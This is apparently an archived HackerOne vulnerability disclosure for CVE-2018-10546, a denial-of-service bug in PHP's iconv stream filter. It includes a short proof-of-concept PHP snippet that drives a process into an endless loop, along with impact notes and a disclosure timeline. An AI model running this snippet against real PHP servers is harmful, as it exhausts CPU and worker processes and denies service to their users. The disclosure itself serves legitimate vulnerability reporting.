---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2020-10-12
submitted: 2019-03-05T16:55:38.672Z
bounty_usd: null
votes: 44
cve: "CVE-2018-10546"
program: "[[programs/ibb|Internet Bug Bounty]]"
reporter: "meitis"
source: "https://hackerone.com/reports/505278"
title: "DOS in stream filters"
---
# DOS in stream filters

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 44 | **Program:** Internet Bug Bounty | **Disclosed:** 2020-10-12

- Report: [https://hackerone.com/reports/505278](https://hackerone.com/reports/505278)
- CWE: Uncontrolled Resource Consumption | CVE: CVE-2018-10546
- Submitted: 2019-03-05T16:55:38.672Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

see bug report
https://bugs.php.net/bug.php?id=76249

as simple as
<?php
$fh = fopen('php://memory', 'rw');
fwrite($fh, "abc");
rewind($fh);
stream_filter_append($fh, 'convert.iconv.iso-10646/utf8//IGNORE', STREAM_FILTER_READ, []);
echo stream_get_contents($fh);

=> one process running in an endless loop

## Impact

DOS, process ends up in an endless loop, CPU (or available php processes or both) of affected system get easily exhausted

## Timeline

- **Report Filed**
- **2019-03-06** @h1_analyst_leon: Hey @meitis - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
- **Cve Id Added**
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2020-10-11** @meitis: Hello @reed

feel free to disclose this, the bug has already been disclosed by the php bug tracker.

thank you and best regards
Paul
- **Manually Disclosed**
